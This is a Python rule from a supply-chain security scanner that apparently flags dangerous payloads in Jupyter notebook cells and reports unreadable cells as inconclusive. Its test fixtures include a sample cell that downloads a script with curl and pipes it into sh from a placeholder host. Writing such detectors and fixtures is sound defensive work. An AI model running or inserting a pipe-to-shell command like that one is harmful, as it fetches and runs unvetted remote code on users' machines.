import ast
import json
import re
from collections.abc import Generator, Iterable, Iterator
from dataclasses import dataclass, field
from pathlib import Path

from guardana.core.evaluator.base import Verdict
from guardana.core.report import Evidence, Finding
from guardana.core.rule import RuleContext, RuleMeta
from guardana.core.rule.fixture import FixtureOutcome, RuleFixture, materialise
from guardana.core.safety import Detection
from guardana.core.severity import Severity
from guardana.core.source import PythonSource
from guardana.core.target import Capability, FileReader, Target, TargetKind
from guardana.core.taxonomy import (
    NIST_SUPPLY_CHAIN,
    OWASP_ASI05_2026,
    OWASP_LLM03_2025,
    OWASP_LLM04_2026,
)
from guardana.rules._base import ArtifactRule
from guardana.rules.supply_chain import _samples
from guardana.rules.supply_chain._code_sinks import code_sinks
from guardana.rules.supply_chain._ipython_cells import (
    PIPE_TO_SHELL,
    CellReading,
    NotebookState,
    bind_names,
    ipython_calls,
    local_scripts,
    read_cell,
    read_shell_command,
)
from guardana.rules.supply_chain._leads import lead_verdict, unread_component, unscanned_verdict
from guardana.rules.supply_chain._reading import MAX_SCAN_BYTES, read_text_prefix

# How deep calls on the IPython object may nest inside the code they run before the
# rest is reported unread.
_MAX_IPYTHON_NESTING = 4
_SCRIPTS_LISTED = 5


@dataclass
class _NotebookScan:
    """One notebook being scanned: its path, the state its cells build, what was unread."""

    path: Path
    ctx: RuleContext
    state: NotebookState = field(default_factory=NotebookState)
    unread: set[str] = field(default_factory=set)
    scripts: list[str] = field(default_factory=list)
    """The local scripts the cell being read runs, as written."""


def _cell_source(cell: object) -> str | None:
    """Return a code cell's source (str or list-of-lines joined), else None."""
    if not isinstance(cell, dict) or cell.get("cell_type") != "code":
        return None
    source = cell.get("source")
    if isinstance(source, list):
        return "".join(s for s in source if isinstance(s, str))
    return source if isinstance(source, str) else None


def _languages(doc: dict[str, object]) -> list[str]:
    """Return the kernel languages a notebook declares, in the metadata IPython writes."""
    metadata = doc.get("metadata")
    if not isinstance(metadata, dict):
        return []
    declared: list[object] = []
    kernelspec = metadata.get("kernelspec")
    if isinstance(kernelspec, dict):
        declared.append(kernelspec.get("language"))
    language_info = metadata.get("language_info")
    if isinstance(language_info, dict):
        declared.append(language_info.get("name"))
    return [
        value if isinstance(value, str) else repr(value)
        for value in declared
        if value is not None and not (isinstance(value, str) and not value.strip())
    ]


def _malformed_cell(cell: object) -> str | None:
    """Say how a cell breaks the notebook format in a way that would hide code; else None."""
    if not isinstance(cell, dict):
        return "is not a JSON object"
    if cell.get("cell_type") != "code":
        return None
    source = cell.get("source")
    if isinstance(source, str):
        return None
    if isinstance(source, list) and all(isinstance(line, str) for line in source):
        return None
    return "has a source that is not text"


def _is_python(language: str) -> bool:
    return re.fullmatch(r"i?python[\d.]*", language.strip().lower().replace(" ", "")) is not None


class NotebookPayloadRule(ArtifactRule):
    """Flags dangerous code and shell payloads inside Jupyter notebook (`.ipynb`) cells.

    Notebooks are a primary ML distribution format, yet the `.py` scanners never
    see inside them. This applies the shared code-sink detection to each code
    cell, and catches the notebook-only channels — a `!curl … | sh` escape, a
    `%%bash` cell or a `%alias`. A cell that runs a local script (`!sh setup.sh`,
    `%%bash` running `./run`) gets one low finding naming it. A cell whose Python cannot
    be parsed, a magic that runs code the rule does not read (`%run`, `%pip`, `%%perl`),
    code handed the IPython object and a notebook whose kernel is not Python are reported
    as inconclusive, never silently skipped: an un-analyzable cell is not a proven-clean one.
    """

    meta = RuleMeta(
        id="guardana.supply_chain.notebook_payload",
        title="Dangerous payload in a notebook cell",
        severity=Severity.HIGH,
        target_kind=TargetKind.ARTIFACT,
        taxonomy=(
            OWASP_LLM03_2025,
            OWASP_LLM04_2026,
            NIST_SUPPLY_CHAIN,
            OWASP_ASI05_2026,
        ),
        required_capabilities=frozenset({Capability.READ_FILES}),
        detection=Detection.HEURISTIC,
    )

    def fixtures(self) -> Iterable[RuleFixture]:
        """Sample a download piped to a shell, a plain cell and a notebook that is not JSON."""
        return materialise(
            (
                _samples.sample(
                    "a shell escape piping a download into sh",
                    FixtureOutcome.FINDING,
                    {
                        "setup.ipynb": _samples.notebook(
                            "!curl -s https://setup.example.invalid/i.sh | sh\n"
                        )
                    },
                ),
                _samples.sample(
                    "a cell that only prints",
                    FixtureOutcome.CLEAN,
                    {
                        "setup.ipynb": _samples.notebook(
                            "import json\nprint(json.dumps({'ok': True}))\n"
                        )
                    },
                ),
                _samples.sample(
                    "a notebook cut off mid-document",
                    FixtureOutcome.INCONCLUSIVE,
                    {"setup.ipynb": _samples.notebook("print(1)\n")[:-2]},
                ),
            )
        )

    def run(self, target: Target, ctx: RuleContext) -> Iterable[Finding]:
        """Scan every `.ipynb` for code-execution sinks and shell payloads."""
        if not isinstance(target, FileReader):
            return
        for path in target.iter_files((".ipynb",)):
            yield from self._scan(path, ctx)

    def _scan(self, path: Path, ctx: RuleContext) -> Iterator[Finding]:
        prefix = read_text_prefix(path, errors="ignore")
        if prefix is None:
            yield self._unscanned(path, "the file could not be read", ctx)
            return
        raw, truncated = prefix
        if truncated:
            yield self._unscanned(
                path, f"the file is larger than the {MAX_SCAN_BYTES}-byte read bound", ctx
            )
            return
        try:
            doc = json.loads(raw)
        except ValueError:
            # Not one cell was examined, so a malformed notebook is no cleaner than
            # one that holds a payload.
            yield self._unscanned(path, "the notebook could not be parsed as JSON", ctx)
            return
        cells = doc.get("cells") if isinstance(doc, dict) else None
        if not isinstance(cells, list):
            yield self._unscanned(path, "the notebook declares no list of cells", ctx)
            return
        foreign = next((name for name in _languages(doc) if not _is_python(name)), None)
        if foreign is not None:
            reason = f"its kernel language is {foreign}, which this rule does not read"
            yield self._unscanned(path, reason, ctx)
            return
        scan = _NotebookScan(path, ctx)
        malformed: str | None = None
        for index, cell in enumerate(cells):
            problem = _malformed_cell(cell)
            if problem is not None:
                malformed = malformed or f"cell {index} {problem}"
                continue
            source = _cell_source(cell)
            if source is not None:
                yield from self._scan_cell(scan, index, read_cell(source, scan.state))
                yield from self._local_scripts(scan, index)
        if malformed is not None:
            yield self._unscanned(path, malformed, ctx)

    def _unscanned(self, path: Path, reason: str, ctx: RuleContext) -> Finding:
        """Say the notebook was not examined, rather than returning as if it were clean."""
        ctx.shortfall(unread_component(self.meta.id, path, reason))
        return Finding(
            rule_id=self.meta.id,
            severity=Severity.LOW,
            title="Notebook not scanned",
            taxonomy=self.meta.taxonomy,
            target_ref=str(path),
            evidence=Evidence(
                summary=f"notebook not scanned: {reason}", detail=f"file={path.name}"
            ),
            verdict=unscanned_verdict("the notebook could not be read, so nothing was cleared"),
        )

    def _scan_cell(
        self, scan: _NotebookScan, index: int, cell: CellReading, depth: int = 0
    ) -> Iterator[Finding]:
        path = scan.path
        scan.state.bound |= cell.bound
        for line in cell.shell:
            if PIPE_TO_SHELL.search(line):
                yield self._finding(
                    path, index, Severity.HIGH, "shell escape pipes a download into a shell"
                )
            scan.scripts.extend(local_scripts(line))
        for label in dict.fromkeys(cell.unread):
            yield self._unread(scan, index, label)
        tree = yield from self._parse(scan, index, cell)
        if tree is None:
            return
        bind_names(tree, scan.state)
        # A notebook cell is source without a file of its own, so it is wrapped in
        # the same index the `.py` rules use — one walk, and `code_sinks` needs no
        # second shape to understand.
        for _lineno, why, lead in code_sinks(PythonSource(path, cell.python, tree)):
            yield self._finding(
                path, index, Severity.HIGH, why, lead_verdict(why) if lead else None
            )
        for kind, text in ipython_calls(tree, scan.state):
            if text is None or depth >= _MAX_IPYTHON_NESTING:
                yield self._unread(scan, index, kind)
                continue
            nested = read_shell_command(text) if kind == "shell" else read_cell(text, scan.state)
            yield from self._scan_cell(scan, index, nested, depth + 1)

    def _local_scripts(self, scan: _NotebookScan, index: int) -> Iterator[Finding]:
        """Name, in one low finding, the local scripts a cell runs, whose code is not read."""
        scripts = list(dict.fromkeys(scan.scripts))
        scan.scripts.clear()
        if not scripts:
            return
        listed = ", ".join(scripts[:_SCRIPTS_LISTED])
        more = len(scripts) - _SCRIPTS_LISTED
        noun = "local script" if len(scripts) == 1 else "local scripts"
        yield self._finding(
            scan.path,
            index,
            Severity.LOW,
            f"cell runs {noun}: {listed}{f', and {more} more' if more > 0 else ''}",
        )

    def _unread(self, scan: _NotebookScan, index: int, label: str) -> Finding:
        """Report something a cell runs that was not read; name it once per notebook."""
        if label not in scan.unread:
            scan.unread.add(label)
            reason = f"{label} runs code or input this rule does not read"
            scan.ctx.shortfall(unread_component(self.meta.id, scan.path, reason))
        return self._finding(
            scan.path,
            index,
            Severity.LOW,
            f"cell runs {label}, which this rule does not read",
            unscanned_verdict(f"what {label} runs was not read, so it was not cleared"),
        )

    def _parse(
        self, scan: _NotebookScan, index: int, cell: CellReading
    ) -> Generator[Finding, None, ast.Module | None]:
        """Parse a cell's Python; return its tree, or None after reporting why there is none."""
        try:
            tree = None if cell.too_complex else ast.parse(cell.python)
        except (MemoryError, RecursionError):
            tree = None
        except SyntaxError:
            yield self._finding(
                scan.path,
                index,
                Severity.LOW,
                "notebook cell could not be parsed as Python; not analyzed",
                unscanned_verdict("the cell could not be parsed, so nothing in it was cleared"),
            )
            return None
        if tree is None:
            if "too complex" not in scan.unread:
                scan.unread.add("too complex")
                reason = "a cell is too complex for the Python parser"
                scan.ctx.shortfall(unread_component(self.meta.id, scan.path, reason))
            yield self._finding(
                scan.path,
                index,
                Severity.LOW,
                "notebook cell is too complex to parse as Python; not analyzed",
                unscanned_verdict("the cell could not be parsed, so nothing in it was cleared"),
            )
        return tree

    def _finding(
        self,
        path: Path,
        index: int,
        severity: Severity,
        summary: str,
        verdict: Verdict | None = None,
    ) -> Finding:
        return Finding(
            rule_id=self.meta.id,
            severity=severity,
            title=self.meta.title,
            taxonomy=self.meta.taxonomy,
            target_ref=f"{path}:cell{index}",
            evidence=Evidence(summary=summary, detail=f"{path.name} cell {index}"),
            verdict=verdict,
        )
